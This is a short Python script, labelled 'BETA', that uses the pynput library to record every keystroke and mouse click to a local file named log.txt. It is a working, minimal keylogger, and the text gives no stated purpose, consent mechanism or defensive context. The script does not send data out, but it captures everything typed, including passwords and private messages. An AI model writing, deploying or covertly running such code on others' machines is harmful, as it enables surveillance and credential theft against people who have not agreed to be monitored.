# BETA

from pynput import keyboard, mouse

def on_press(key):
    with open('log.txt', 'a') as f:
        f.write(f'Key {key} pressed\n')

def on_click(x, y, button, pressed):
    with open('log.txt', 'a') as f:
        f.write(f'Mouse clicked at ({x}, {y}) with button {button}\n')

with keyboard.Listener(on_press=on_press) as listener1, mouse.Listener(on_click=on_click) as listener2:
    listener1.join()
    listener2.join()
